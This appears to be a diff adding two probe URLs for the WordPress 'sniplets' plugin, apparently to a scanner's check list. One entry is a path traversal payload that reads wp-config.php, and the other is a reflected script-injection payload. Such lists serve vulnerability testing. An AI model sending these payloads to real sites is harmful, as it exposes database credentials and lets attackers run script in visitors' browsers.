@@ -1,0 +1,2 @@
+/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php
+/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
